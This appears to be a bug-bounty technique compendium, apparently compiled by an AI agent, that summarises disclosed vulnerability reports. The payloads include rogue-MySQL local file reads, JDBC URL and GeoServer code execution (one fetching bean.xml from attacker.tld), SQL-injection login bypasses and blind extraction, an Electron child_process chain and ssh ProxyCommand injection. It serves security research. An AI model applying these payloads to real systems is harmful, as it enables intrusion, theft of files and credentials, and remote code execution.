### [Bugbountyskills.md] 17.485 ANY "CONNECT YOUR OWN DATABASE" FEATURE IS A CLIENT-SIDE FILE READ WHEN `local_infile` IS ON: POINT THE APP'S MYSQL CLIENT AT YOUR ROGUE SERVER, SUBMIT `LOAD DATA LOCAL INFILE '<file>'`, AND THE APP SERVER SENDS YOU ITS OWN FILES — NO SQLi NEEDED (Infogram, HackerOne #719875, "LFI through the MySQL connection", weakness Information Disclosure, severity high (User), reporter `muon4`, submitted 2019-10-22 / disclosed 2019-11-12; full body read IN FULL this pass on the live `.json` route, `visibility: full`, 1,665 B; UNVERIFIED — not reproduced). ENTRY POINT, verbatim: "Login" -> "Make a new infographic or navigate to the existing one" -> "Now add new MySQL connection under `data` section". THE STATEMENT, verbatim (the "SELECT" field accepts it — statement type not enforced): `LOAD DATA LOCAL INFILE '/etc/passwd'` / `INTO TABLE asd.asd` / `FIELDS TERMINATED BY "\n"`. THE ROGUE SERVER, verbatim: fill "IP address, port etc.." pointing at "the 'evil' MySQL server with the database/table called `asd`"; `tcpdump -s 0 port 3306 -i eth0 -w infogramsteal.pcap`. TRIGGER + PROOF, verbatim: "Now click `Create` in the infogram app" -> pcap shows the LOGIN REQUEST "where you can see that `LOAD DATA LOCAL` is set to the value `1` which is basicly same than `true`" and the **Request Command Unknown** frame "which basicly contains the value of the file `/etc/passwd`" — "`/etc/passwd` and `/etc/hosts`" read from the server. FIX, verbatim: "Disable the `LOAD DATA LOCAL` feature if possible." DETECTION SIGNAL: a feature that connects to a USER-SUPPLIED DB host/port (BI/dashboard "connect your database", data import, analytics sync); a client handshake with the `local_infile` capability (`LOAD DATA LOCAL = 1` in the login packet); a statement field accepting non-SELECT. TRANSFERABLE TEST: (1) stand up a rogue MySQL server (`fnmsd/MySQL_Fake_Server`, `4ra1n/mysql-fake-server`, rogue_server.py) on 3306; (2) point the target's DB-connection feature at it and submit `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY '\n'`; (3) `tcpdump -s 0 port 3306 -w x.pcap` and look for login `LOAD DATA LOCAL = 1` + a file-transfer frame carrying the bytes; (4) escalate paths to `.env`, app config, `/proc/self/environ`. Rule: **no SQLi is needed — if the app opens a MySQL connection to YOUR server with a statement YOU wrote, its own client hands you its local files whenever `local_infile` is on.** WHY IT IS A NEW GENERAL METHOD: 0 hits for `719875`, `muon4`, `LOAD DATA`, `INFILE`, `rogue MySQL`, `evil MySQL`, `fake MySQL`; the only `local_infile` mentions are the OOB-SQLi note where `local_infile`/`secure_file_priv` BLOCK exfil (the inverse) and out-of-target vulhub labs; the recorded SSRF->rogue-service (gopher/Redis) and OOB-SQLi material moves data OUT via egress, while this makes the app's DB CLIENT push local FILES OUT to the attacker. Slot 17.485. UNVERIFIED (not reproduced).

### [Bugbountyskills.md] 17.511 WHEN USER INPUT IS COMPILED INTO GENERATED SOURCE, THE COMMENT IT SITS IN IS THE BOUNDARY — AND IN A COMPILE-ONLY JVM CONTEXT, SHADOW A CLASS THE GENERATED CODE REFERENCES (`Double` at `Double.NaN`) WITH A CARRYING `static{}` INITIALIZER, WHICH THE JVM RUNS ON FIRST STATIC-FIELD ACCESS EVEN THOUGH NOTHING INSTANTIATES IT (Synacktiv, "Exploiting CVE-2022-24816: A code injection in the jt-jiffle extension of GeoServer", Vincent Herbulot & Rémi Matasse, 2022-08-12; CVE-2022-24816 CVSS 9.8, JAI-EXT < 1.1.22; writeup `https://www.synacktiv.com/en/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver.html`, read IN FULL this pass 2026-11-11 — `web_extract` head+tail plus the extractor's saved full text for the omitted exploitation half; UNVERIFIED — not reproduced). THE METHOD (the article's own): GeoServer WPS `ras:Jiffle` (unauthenticated `POST /geoserver/wms`) compiles the user's Jiffle DSL "into Java code which is then byte-code compiled into executable Java code" (Janino), embedding the script UNESCAPED in a Javadoc of the generated source — "Jiffle integrates the comments when generating the final java source code without properly escaping them"; payload `<wps:LiteralData>dest = 1; */ INJECTED JAVA CODE /*</wps:LiteralData>`, the trailing `/*` re-opening the comment; compiler error `One of 'class enum interface @' expected instead of '*'` (which REFLECTS the generated source) proves the breakout. Execution: "We do not control an object that will be instantiated... the classes that we create are not directly loaded into memory, they are rather lazy-loaded by the class loader" — so the article redeclares the `Double` class the generated `double result = Double.NaN;` references, with `public class Double { public static double NaN = 0; static { Runtime.getRuntime().exec("id"); throw new RuntimeException(allLines); } }` — JLS: "A class or interface type T will be initialized immediately before... A static field declared by T is assigned", and "static blocks of code are executed when a class is loaded in memory"; command output returns in the WPS `<ows:ExceptionText>` (`ExceptionInInitializerError - uid=0(root)...`). THE GENERAL METHOD: (1) probe any DSL/script/template→generated-code feature with comment terminators (`*/`, `-->`, `%>`, `% end`) and read compiler errors for a REFLECTION of the generated source; (2) inject `*/ <code> /*`-style payloads and confirm via errors naming YOUR tokens ("Redeclaration of type", "cannot find symbol"); (3) when the engine never instantiates your class (compile-only contexts: codegen+bytecode compilers, sandboxed template engines, formula evaluators), search the leaked generated source for references to a REDECLARABLE class (static-field accesses like `Double.NaN`) and SHADOW it with a class whose `static {}` block is your payload — class initialization fires at the static-field access; (4) exfiltrate through the service's error channel (`throw new RuntimeException(cmdOutput)`) or one OOB callback. DETECTION SIGNAL: any user-script→generated-source surface; verbose compiler errors that reflect the generated code ("Runtime source error for source: ...") with your input inside a `/** ... */` block; a DSL whose grammar has comment syntax. TRANSFERABLE TEST: the probe→breakout→shadow→throw sequence above. Rule: **a DSL compiled into generated source is a code-injection surface — the comment boundary is the escape; and in a compile-only JVM context, class shadowing plus a static initializer is the execution hook, because the JVM initializes a class at first static-field access even with zero instantiations.** WHY IT IS A NEW GENERAL METHOD: the comment-terminator breakout itself is owned by §17.480 (Elastic Synthetics Recorder); the NEW atoms are the compile-only→execution primitive (class SHADOWING + STATIC INITIALIZER at a static-field access the generated code makes) and the throw-into-error-report output channel — 0 hits for `static initializer`, `static block`, `class shadow`, `Double.NaN`, `redeclaration of type`, `janino`, `jiffle` across the write targets. Slot 17.511. UNVERIFIED (not reproduced).

### [Bugbountyskills.md] 17.512 A USER-SUPPLIED JDBC URL REACHING `DriverManager.getConnection` IS AN RCE PRIMITIVE: THE DRIVER'S URL PARAMETERS NAME CLASSES TO INSTANTIATE, FACTORIES TO CALL WITH AN ATTACKER STRING, AND DESERIALIZERS TO FEED — ATTACK THE DEPLOYED DRIVERS (socketFactory class-with-string-arg, MySQL `autoDeserialize` OOB object delivery, hardcoded-key encrypted state → `readObject` in-URL) (Steven Seeley / sourceincite, "IAM Whoever I Say IAM :: Infiltrating VMWare Workspace ONE Access Using a 0-Click Exploit", 2022-08-11, Black Hat USA 2022; chain "Hekate", exploits `https://github.com/sourceincite/hekate/`; writeup `https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html`, read IN FULL this pass 2026-11-11 via browser render after `web_extract` twice elided sections; UNVERIFIED — not reproduced). THE METHOD (the article's own): `DBConnectionCheckController.dbCheck` (`jdbcUrl`/`dbUsername`/`dbPassword` request params) → `FactoryHelper.getConnection` → `DriverManager.getConnection(jdbcUrl, ...)`; the admin gate is conditional (`if (countOrganizations() > 0L) assureAuthenticatedApiAdmin()`) and its exception is swallowed. Three RCE routes inside the URL string: (a) MySQL `autoDeserialize=true` — "the server would connect back to the attacker's malicious MySQL server where it could deliver an arbitrary serialized Java object that could be deserialized on the server" (ysoserial CommonsBeanutils1); (b) `jdbc:postgresql://si/saas?&socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://attacker.tld:9090/bean.xml` — "trigger the execution of a constructor defined in an arbitrary Java class with a controlled string argument"; (c) no-outbound: `socketFactory=com.vmware.licensecheck.LicenseChecker&socketFactoryArg=<state>` — `LicenseChecker(String)` → `LicenseHandle.setState` → Base64 decode → `Encrypt.decrypt` with a HARDCODED key (`keyBytes_v2`) → `ObjectInputStream.readObject()` on attacker bytes wrapped via the vendor's own classes; "the first connection to a PostgreSQL database doesn't need to be established for the attack to succeed so an invalid host/port is perfectly fine." THE GENERAL METHOD: for every endpoint that takes a connection URL (setup wizards, "test connection" buttons, migration/import tools, BI/report datasources): (1) prove the sink with one benign OOB probe per deployed driver family (`socketFactory=...FileSystemXmlApplicationContext&socketFactoryArg=http://<collab>/b.xml`; a MySQL `autoDeserialize` probe to `<collab>:3306`); (2) then run the driver matrix — socketFactory/`socketFactoryArg` class-with-string-arg instantiation (Spring `FileSystemXmlApplicationContext`, JNDI-in-capable classes), MySQL `queryInterceptors`/`autoDeserialize`/`detectCustomCollations` object delivery, vendor classes with decrypt+`readObject` on URL-carried state, `dataSourceName` JNDI; (3) keep the proof to one OOB callback / one benign command. DETECTION SIGNAL: any user-controlled `jdbcUrl`/`connection.url`/`dbUrl` parameter reaching a driver manager; verbose `SQLException` stacks answering URL probes; conditional/authz-swallowed setup endpoints. TRANSFERABLE TEST: the sink-proof probes + the driver matrix above against every DB-URL input. Rule: **a "test DB connection" URL is code execution: JDBC drivers are plugin architectures whose URL parameters instantiate classes, invoke constructors with attacker strings, and deserialize attacker bytes — enumerate the DEPLOYED drivers and attack each one's property surface.** Companion chain shape recorded in the same entry: a default/bootstrap OAuth2 client with a FIXED id (`Service__OAuth2Client`) plus an UNAUTHENTICATED activation endpoint that mints `client_id`/`client_secret` (`POST .../oauth2/generateActivationToken/<id>` → `POST .../oauth2/activate`) = complete authentication bypass before the JDBC step. WHY IT IS A NEW GENERAL METHOD: the recorded JDBC material is different substrates (Kafka-Connect connector PROPERTIES naming classes/modules — #1547877 JDBC-driver file write + Jolokia, #1529790 `*.sasl.jaas.config`; heapdump `jdbc:` string grepping) — 0 hits for `socketFactory`, `autoDeserialize`, `FileSystemXmlApplicationContext`, `LicenseChecker`, `dbCheck`, `generateActivationToken`, `Service__OAuth2Client` across the write targets. Slot 17.512. UNVERIFIED (not reproduced).

### [bugbountyhuntingskills.md] 7.2 Unauthenticated SQLi in a plugin → insecure deserialization → RCE — Krisp

**Source:** HackerOne #1842674 — Krisp, *"SQL Injection + Insecure Deserialization leads to Remote
Code Execution on https://krisp.ai"*, Critical.

**Core method**
- Component-level recon: the WordPress plugin `tenweb-speed-optimizer` (< 2.12.22) exposes a REST
  route `/wp-json/tenwebio/v2/compress-one`.
- The route is **unauthenticated** — the vendor originally published it as "authenticated", which is
  the classic triage dispute to pre-empt in the report (Wordfence later corrected it).
- SQLi gives write primitives into plugin-controlled rows/options. The plugin also calls
  `unserialize()` on data it reads back from those rows.
- Chain: inject a serialized PHP object as the stored value → request the endpoint that reads and
  deserializes it → gadget chain in an installed dependency executes.
- Report structure that got it accepted: two labelled stages, each independently reproducible, plus
  the full chain — not one blob.

**Lesson.** A SQLi in a PHP app is rarely just data theft: any `unserialize()`/`maybe_unserialize()`
on a table you can write to is an RCE staging point. Enumerate `unserialize`, `eval`, `include`, and
`call_user_func` sinks *after* confirming the write primitive.

**Transferable test.** `wp-json` route enumeration → version-diff the plugin against its changelog →
for each writable table, grep the codebase for the read path → look for `unserialize` on that column.

---

### [bugbountyhuntingskills.md] 7.3 Login-form SQLi (auth bypass) and the surrounding auth surface

**Source:** Intigriti, *"Broken Authentication: Advanced Exploitation Guide"* (2024-11-30).

**Core method**
- Baseline bypass on a concatenated login query:
  ```http
  POST /login.php HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username=admin&password=xyz' OR 1=1; -- 
  ```
  Variants worth trying in order: `' OR 1=1-- -`, `' OR '1'='1`, `admin'-- -`, `') OR ('1'='1`,
  and the MySQL `/*!50000OR*/` comment form when a WAF is present.
- The password field is not the only injectable one — test `username`, hidden `role`, `tenant`,
  `redirect`, and any "remember me" identifier.
- Adjacent auth primitives in the same guide, all worth a checklist slot:
  - **No rate limit** → credential stuffing; enumerate users first via response-length/timing delta.
  - **Predictable remember-me** token = `userid:hash`; check whether the hash is `md5(username)` or
    otherwise derivable, and whether the cookie is `HttpOnly`/`Secure`.
  - **Predictable/eternal password-reset tokens** → reset any account.
  - **IP-allowlist auth** → spoof `X-Forwarded-For` / `X-Real-IP` / `Client-IP` when a proxy derives
    the client IP from a header.
  - **Magic links** with no expiry → replay a leaked link months later.

**Transferable test.** For every auth endpoint, capture the exact SQL error string, then run the
boolean pair (`' AND 1=1-- -` vs `' AND 1=2-- -`) and a time pair (`SLEEP(5)`) before assuming the
form is safe because the first payload returned a generic error.

---

### [bugbountyhuntingskills.md] 7.4 SQLi detection ladder (synthesis of the above)

1. **Reflection probe** — `'`, `"`, `\`, `)`, `%27` and look for a DB error, a 500, or a body-length
   delta. Errors are the cheapest oracle.
2. **Boolean pair** — `AND 1=1` / `AND 1=2` on the same parameter, same encoding.
3. **Time pair** — `SLEEP(5)` / `pg_sleep(5)` / `WAITFOR DELAY '0:0:5'`, only after boolean works.
4. **Context escape** — the injection may sit inside `IN (...)`, `ORDER BY`, `LIMIT`, or a `LIKE`
   string; different terminators (`)`, `-- -`, `#`, `/* */`) are needed per context.
5. **Second-order** — store the payload in a profile field, then trigger the admin/report view that
   concatenates it. The write endpoint looks clean; the read endpoint is the sink.
6. **Escalation** — `LOAD_FILE()`, `INTO OUTFILE` (needs `FILE` priv + `secure_file_priv`), stacked
   `INSERT` (as in 7.1), then `xp_cmdshell`/`COPY ... PROGRAM`/`lo_import` for OS execution.

---

### [bugbountyhuntingskills.md] 7.6 PostgreSQL `IN`-list array-key injection — Drupal CVE-2026-9082

**Source:** HackerOne (SLD/Tanto Security, disclosed 2026-05), CVE-2026-9082 / SA-CORE-2026-004,
CVSS 9.8 (CISA KEV). Fixed in Drupal 10.4.10 / 10.5.10 / 10.6.9 / 11.1.10 / 11.2.12 / 11.3.10.

**Core method**
- The PostgreSQL EntityQuery `Condition` subclass overrides case-insensitive `IN (...)` compilation
  by iterating `$condition['value']` **as an associative array** and concatenating `$key` directly into
  the PDO placeholder name:
  ```php
  foreach ($condition['value'] as $key => $value) {
      $where_id = $where_prefix . $key;
      $condition['where'] .= 'LOWER(:' . $where_id . '),';
  }
  ```
  The loop assumes `$key` is always an integer — but JSON:API and the JSON login endpoint let the caller
  send an **object** instead of an array, making `$key` a user-controlled string.
- PDO's named-parameter parser stops at the first non-identifier character (`[a-zA-Z0-9_]`), so a key
  like `0||(subquery)` produces `:prefix0` (binding to the legitimate value) followed by literal SQL
  `|| (subquery)` — the `||` is PostgreSQL string concatenation that **appends** the subquery result to
  the bound value inside the `LOWER()` call.
- Two anonymous vectors:
  1. **JSON login** (`/user/login?_format=json`) — `name` sent as a 2-key JSON object; the second key
     carries `||1/(SELECT CASE WHEN (subquery) THEN 0 END)` for boolean-blind extraction. No auth, no
     token, no content needed on the site — only the default anonymous "access content" permission.
  2. **JSON:API** (`/jsonapi/node/article?...`) — a single backtick, single-quote, or double-quote in the
     array key breaks out of the placeholder name and produces a `SQLSTATE[HY093]` error (HTTP 500) —
     error-based detection.
- The same `filter[...][condition][value][key]` syntax works against any entity type exposed by JSON:API
  (`article`, `page`, etc.).
- Escalation: the `1/N` divide-by-zero gadget triggers a PostgreSQL error that can be used for
  error-based extraction, and `COPY ... TO PROGRAM` over the injection reaches RCE.

**Lesson.** Any place that iterates user-controlled keys into a SQL string is an injection point, even
through a named-parameter API. PDO's `:` placeholder name parser is not a SQL parser — it only reads
`[a-zA-Z0-9_]` after the colon, so any other character terminates the name and the rest is raw SQL.
The fix is `array_values()` before SQL generation — a single call that strips attacker keys everywhere.

**Transferable test.** For any ORM/query-builder `IN (...)` compiled from a user-supplied collection,
send an associative object instead of an array and put a `|` or `(` in the key. If you get a 500 or a
boolean difference, you've reached the SQL text through the key.

---

### [bugbountyhuntingskills.md] 7.7 SQLi via the POST **parameter name** — NASA Space Place (Bugcrowd disclosure)

**Source:** Bugcrowd disclosure (NASA VDP), *“Unauthenticated Error-Based SQL Injection via POST Parameter
Name in /api/experiment/answer/new/”* (2026-08).

**Core method**
- The endpoint dynamically constructed an `INSERT` using **parameter names** as column identifiers:
  ```php
  $sql = "INSERT INTO <table> (" . implode(",", array_keys($_POST)) . ") VALUES (...)";
  ```
- Most hunters only test parameter *values*. Here the **name** is the sink — `array_keys($_POST)` is
  user-controlled because the client sends whatever keys it wants in the POST body.
- Because the parameter name is placed **outside** any quoting in the column list, no escaping is needed
  to break out. A crafted key like `foo), (SELECT ...` closes the `INSERT` and opens a new statement or
  subquery directly.
- The endpoint was **unauthenticated** — no session, no token, just a public form submission flow.

**Lesson.** Parameter names are the forgotten injection surface. Any framework that maps POST/GET keys
to database columns, struct fields, or query parameters must validate/whitelist the *names*, not just the
values. Scanners almost never test this because they send a fixed key set. The detection signal is: send
a parameter name containing SQL syntax (`'`, `)`, `(`, `SELECT`) and watch for a 500 or a reflected
SQL error.

**Transferable test.** For every form-processing endpoint, send a single request with a deliberately
malformed parameter name (e.g. `name' OR 1=1--`) and compare the error response against a baseline
parameter name. Also test JSON request bodies where keys are arbitrary strings.

---

### [bugbountyhuntingskills.md] 7.8 Time-based blind SQLi in an `ORDER BY` / `sort` parameter — NASA JPL Photojournal

**Source:** Bugcrowd disclosure (NASA VDP, disclosed 2025-04), P1, by MiguelSegoviaGil.

**Core method**
- The `sort` parameter of the search endpoint was concatenated directly into the SQL `ORDER BY` clause.
  Value injection payloads fail in `ORDER BY` (no string context), but **boolean/time functions work**
  because the parameter is embedded raw: `ORDER BY <user_input>`.
- The payload used `BENCHMARK()` (MySQL) with conditional logic inside the sort expression:
  ```
  sort=title,(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users)='a' THEN BENCHMARK(10000000,SHA1('x')) ELSE 0 END)
  ```
  When the condition is true, `BENCHMARK` runs ~N iterations and the response is delayed; when false,
  the query returns immediately. The delta is the oracle.
- No response body reflection was needed — extraction was purely time-based, making it invisible to
  tools that look for body-length or error changes.

**Lesson.** `ORDER BY` / `sort` parameters are injection points even when value-based payloads don't
work — the injection sits in a SQL *expression* context, not a string-literal context. `CASE WHEN`,
`IF()`, `BENCHMARK()`, `SLEEP()`, and `pg_sleep()` all execute. The detection signal is: a
conditionally delayed response (compare a true condition vs. a false one). Test every `sort`, `orderby`,
`order`, `dir`, `rank`, `page` parameter — they are almost always raw-concatenated.

**Transferable test.** Fire the parameter with `(CASE WHEN 1=1 THEN BENCHMARK(5000000,SHA1(1)) ELSE 0 END)`
vs `(CASE WHEN 1=2 THEN ...)`. If the first is measurably slower, iterate a subquery over the condition.

---

### [bugbountyhuntingskills.md] 7.9 Boolean-blind over Oracle with binary search — NASA REST API (Bugcrowd disclosure)

**Source:** Bugcrowd disclosure (NASA VDP), P1, by martindios (2026-06).

**Core method**
- The `label` parameter of an unauthenticated REST endpoint passed user input into an Oracle SQL query
  raw — no parameterisation, no escaping.
- Because the response body contained structured data (not raw SQL errors), the oracle was **boolean-
  based on content presence**: a true condition returns a result with data; a false condition returns an
  empty result or a different status/body.
- Extraction used **binary search over ASCII values**: `(SELECT ASCII(SUBSTR(column_name,1,1)) FROM ...`
  compared to a midpoint, halving the search space each round. The full database username was recovered
  character-by-character.
- Oracle-specific payloads: `ASCII(SUBSTR(...))`, `DUMP()`, `ROWID`, and the fact that Oracle `SUBSTR`
  is 1-indexed.

**Lesson.** When the DB has no timing function (Oracle's `DBMS_LOCK.DELAY` requires a procedure call
that may be filtered), boolean-based extraction over content presence is the reliable oracle. Binary
search reduces `log₂(95) ≈ 7` requests per character instead of up to 95 linear probes. The technique
generalises to any DB that returns different content for true/false: test `1=1` vs `1=2` first, then
binary-search each character position.

**Transferable test.** Send `param=' AND 1=1` vs `param=' AND 1=2`; if body/status differ, set up
binary search on `SUBSTR(column, pos, 1)` with `ASCII(...) > midpoint` predicates.

---

### [bugbountyhuntingskills.md] 7.10 BigQuery SQL injection — non-standard syntax and system-variable oracles

**Source:** ozgur\_bbh & anilyukk, Synack, >$50,000 (2022, popularised by Intigriti Bug Bytes #159);
cheat sheet at `ozguralp.medium.com/bigquery-sql-injection-cheat-sheet`.

**Core method**
- BigQuery's SQL dialect differs from MySQL/PostgreSQL in several exploitable ways:
  1. **No time-based functions** — `SLEEP()`/`WAITFOR DELAY`/`pg_sleep` do not exist. Time-based
     is off the table; use boolean or UNION instead.
  2. **Table names use backticks** (`` ``) in Standard SQL, not `[]`. A quote `'` in a backtick-delimited
     context is the detection signal — it returns a syntax error showing `FROM `` AS ...`.
  3. **System variables** (no backtick needed, always accessible): `@@project_id`, `@@dataset_id`,
     `@@location`, `@@session_id`, `@@job_id`. These are the info-gathering oracle when
     `INFORMATION_SCHEMA.SCHEMATA` is blocked (common: the DB user lacks permission).
  4. **Error-based via division-by-zero**: `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
     — BigQuery raises on `1/0`, giving a visible error.
  5. **Error-based via CAST**: `CAST(@@project_id AS INT64)` — intentional type mismatch in a
     `UNION SELECT` column triggers a descriptive error containing the value.
  6. **UNION-based** requires counting columns and matching the `GROUP BY` / `AS` structure of the
     original query. Payloads must include the closing `)) AS T1 GROUP BY column_name#` to match the
     query template.
  7. **Boolean-based** via `SUBSTRING`: `' WHERE SUBSTRING((select col FROM `proj:ds.tbl`),1,1)='A'#`
- The hardest part was cross-tenant access: user IDs are 10+ digit non-sequential numbers and backticks
  are **sanitised/blocked** by the application, so cross-project data access required `INFORMATION_SCHEMA`
  or system variables to discover valid project names first.

**Lesson.** Each DBMS has a unique escaping/identifier/quoting scheme. When you see backticks in an
error message, you're likely on BigQuery; when you see `[]` it may be legacy BigQuery; `[` is SQL Server.
Adapt your detection and extraction payloads to the dialect. System variables are the universal oracle
when schema tables are permission-denied.

**Transferable test.** Fire `'` — read the error's `FROM` clause for backtick vs bracket vs double-quote
delimiters. Probe `@@version`, `@@project_id`, `@@dbname` for system variables. Then choose:
UNION (if reflected) → subqueried extraction; boolean-substring (content present/absent);
division-by-zero or CAST error (if errors reflected).

---

### [bugbountyhuntingskills.md] 7.11 mysqljs/mysql escape bypass via JavaScript object type coercion

**Source:** stypr (Flatt Security), *“Finding an unseen SQL Injection by bypassing escape functions in
mysqljs/mysql”* (Feb 2022, Korean/English); reported via Bug Bytes #160 (Intigriti).

**Core method**
- Node.js `mysql` / `mysqljs/mysql` and `mysql2` libraries dispatch escaping by **JavaScript type**,
  not by SQL context. When a parameter is a JS `Object`, the library does **not** quote it as a string
  literal — instead `SqlString.objectToValues()` converts it to `key = 'val'` pairs (as if for a `SET`
  clause):
  ```
  password = { "password": 1 }   →   escape() →   `password` = 1
  ```
  So a login check:
  ```sql
  SELECT * FROM accounts WHERE username = 'admin' AND password = [escaped_password]
  ```
  becomes:
  ```sql
  SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1
  ```
  MySQL evaluates `password = \`password\` = 1` → if the stored password is truthy, `1=1` → always true
  → **authentication bypass**.
- The attack: send `password[password]=1` (urlencoded) or `"password": {"password": 1}` (JSON) instead
  of a plain string. Express/Next.js will parse this into a JS object automatically.
- The library's own docs say this is "safe" because objects are turned into `key='val'` pairs — but that
  assumption holds only inside a `SET` context. In a `WHERE` clause the `= ` assignment creates a
  **new comparison** that evaluates to a boolean, bypassing the password check.
- Scanners miss this because they send string values; the bypass requires changing the **type** of the
  parameter, not the value.

**Lesson.** Client-side escaping libraries that dispatch on type are dangerous when the framework lets
the attacker change the type (JSON body, nested form fields). The fix is twofold:
1. `stringifyObjects: true` in the mysql connection config — forces objects to `toString()` → string escape.
2. Explicit `typeof` type-checking on every parameter before it reaches the query.

**Transferable test.** For every login/auth endpoint, fuzz a parameter with a nested object key:
`password[x]=1` (urlencoded) or `"password": {"x": 1}` (JSON). If the app treats objects as scalars
and the library expands them, the resulting `key = val` clause in a `WHERE` becomes a tautology.

---

### [bugbountyhuntingskills.md] 12.3 HTML injection in a desktop app → Electron RCE (Slack)

**Source:** HackerOne #783877 — Slack desktop, Critical 9–10, by @oskarsv.

**Core method**
- Any in-app redirect (HTML injection, open redirect, XSS) loads attacker HTML inside the Electron
  renderer with `nodeIntegration` reachable.
- The payload overwrites the app's own bridge, leaks the `BrowserWindow` constructor, builds a new
  window with `nodeIntegration: true`, and executes via `child_process`:
  ```js
  window.desktop.delegate = {};
  window.desktop.delegate.canOpenURLInWindow = () => true;
  window.desktop.window = {};
  window.desktop.window.open = () => 1;
  bw  = window.open('about:blank');                 // leak BrowserWindow class
  nbw = new bw.constructor({show:false, webPreferences:{nodeIntegration:true}});
  nbw.loadURL('about:blank');
  nbw.webContents.executeJavaScript(
    'this.require("child_process").exec("calc")'    // or: open /Applications/Calculator.app
  );
  ```
- Non-RCE variant: same construction without `nodeIntegration`, then
  `executeJavaScript('alert(JSON.stringify(localStorage))')` to dump tokens and private data.
- The fix was `contextIsolation` in 4.4.0-beta3.

**Lesson.** Desktop clients inherit every web bug and amplify it. When testing an Electron app,
grep `nodeIntegration`, `contextIsolation`, `webSecurity`, `allowRunningInsecureContent`, and
`shell.openExternal`. A "low" HTML injection becomes Critical inside the client.

---

### [bugbountyhuntingskills.md] 13.7 Argument injection into `ProxyCommand`

**Source:** HackerOne #2293731 — libssh, CVE-2023-6004, **$540**, by @vx01.

**Core method**
- `ProxyCommand`/`ProxyJump` expand the hostname into a shell command. A hostname containing shell
  metacharacters injects:
  ```
  ssh 'foo; id'@host
  ssh -o ProxyCommand='ssh -W %h:%p %h' 'x$(id)'@host
  ```
- Requires user interaction (the victim must connect to the crafted host string).

**Lesson.** "Hostname" is user input. Any feature that interpolates a host, URL, or path into a
command line — `ssh`, `git`, `curl`, `rsync`, backup tools, network scanners — is an argument
injection candidate. Test `-o`, `--upload-pack`, `--config`, and shell metacharacters.

---

## [bugbountyhuntingskills.md] SQLi / RCE

site:hackerone.com "sql injection" ("chained" OR "to rce" OR "writeup")
site:medium.com "sql injection" "bug bounty" ("payload" OR "bypass")

### [bugbountyhuntingskills.md] §17.793 — A FILTER-EXPRESSION MINI-LANGUAGE WITH A DATABASE ESCAPE HATCH IS A SQLi SURFACE: AN UNVALIDATED LIST PARAMETER INTERPOLATED INTO A SERVER-SIDE PREDICATE PLUS A `SQL.Eval(<string>, <arg>)` EVALUATOR THAT PASSES ITS FIRST ARGUMENT RAW TO THE DATABASE GIVES ARBITRARY SUBQUERIES — AND THE ORACLE IS THE RESPONSE SIZE (no error text, no echo)

SOURCE: operator report corpus 2026-11-14 — Magentrix Cloud / Opirus document list (`GET /sys/document/index?fil=…`), attribute-filter injection.
ROUTE: operator handover (in-session).
STATUS: reported-reproduced on the tenant (page-size differential TRUE vs FALSE; cross-table `(SELECT COUNT(*) FROM [system].[User]) > 0`; `LEN(@@VERSION)`=220 and 62 chars of `Microsoft SQL Server 2016 (SP3-GDR) (KB5068401) - 13.0.6475.1` extracted at ~7 requests/char); NOT re-run by this pass.
CLASS: SQL injection through a server-side expression/filter language (CWE-89/CWE-943) with a boolean oracle.
CORE METHOD (as the report states it):
  1. Find a list/search endpoint whose opaque parameter (`fil=`) is documented/observed as a FILTER expression, and rebuild the query the server assembles from it — the payload shows the shape: `zzz") or SQL.Eval("1=1",0) or Name.StartsWith("zzz`.
  2. Map the expression grammar's functions: a `SQL.Eval(<sql-string>, <arg>)` (or equivalent `db.query`/`raw`) member is a direct SQL passthrough — its first argument becomes raw SQL.
  3. Build the oracle on RESPONSE SIZE (document count): TRUE/subquery-true → larger page (~21.9 KB), FALSE → smaller (~18.8 KB). No errors, no echo, no timing.
  4. Extract any scalar: `LEN(@@VERSION) > N` binaries, then per character `ASCII(SUBSTRING(@@VERSION,k,1)) > N` binary search over 31-127 (~7 requests/char; case-insensitive collation means recover case via ASCII codes, not string equality).
  5. Establish the privilege boundary as its own probe (`db_owner` membership, `[system].[User]` readability) and stop at metadata when the policy says so.
DETECTION SIGNAL: an opaque filter/`where`/`fil`/`q` parameter on a list endpoint returning different COUNTS; a query-builder or expression language exposed to the client (`Name.StartsWith(...)`, `SQL.Eval`, `db.*`, `raw`, `$where`); response size varying with a boolean while bodies look identical; error text naming the expression parser.
CHAIN: authenticated (often lowest-privilege) list access → expression injection → `SQL.Eval` raw passthrough → cross-table read with `db_owner` → full tenant data (PII, credentials) via a boolean oracle; the same injection point in a write-capable context is data-integrity loss.
TRANSFERABLE TEST: for every filter/sort/`where`-shaped parameter: (1) capture a baseline byte size (control); (2) inject a terminator plus a boolean (`1=1` vs `1=2`) and diff SIZE — not the body; (3) hunt the evaluator's function list for a database escape hatch (`SQL.Eval`, `db.query`, `raw`, `exec`, `$where`, `$expr`); (4) if found, prove cross-table reach with `(SELECT COUNT(*) FROM <other table>)>0`; (5) extract with LEN/SUBSTRING ASCII binary search since collation hides case. Rule: **a client-supplied filter expression is code; any evaluator that exposes a database function is an injection point, and the oracle can be nothing but response size.**
DEDUPE/DELTA: `SQL.Eval` 0 · `MEQL` 0 · `fil=` 0 across the three targets; the corpus owns boolean-blind/binary-search extraction (§7.9, §7.10) and JS-filter `$where` code injection (§17.3) — NEW atoms: (a) a filter EXPRESSION LANGUAGE with member functions as the injection surface, (b) `SQL.Eval(<string>)` as the DB passthrough, (c) page-SIZE (record-count) as the oracle on an HTML list. FRESHNESS: 2026-11.
HONESTY: not reproduced this pass; the report's own request log/screenshot is the evidence.

---

### [bugbountyhuntingskills.md] §17.794 — A SORT CLAUSE HANDED VERBATIM TO THE ORM IS SQLi EVEN BEHIND A TOKEN BLACKLIST: WITH AN AGGREGATE QUERY AND A SORT KEY THAT IS NOT A KNOWN FIELD, THE `ORDER BY` TEXT IS CONCATENATED INTO SQL — AND T-SQL TYPE UNIFICATION GIVES AN ERROR-BASED BOOLEAN ORACLE (TRUE → the NVARCHAR column is sorted as INT → conversion error/503; FALSE → sorts the INT count/200)

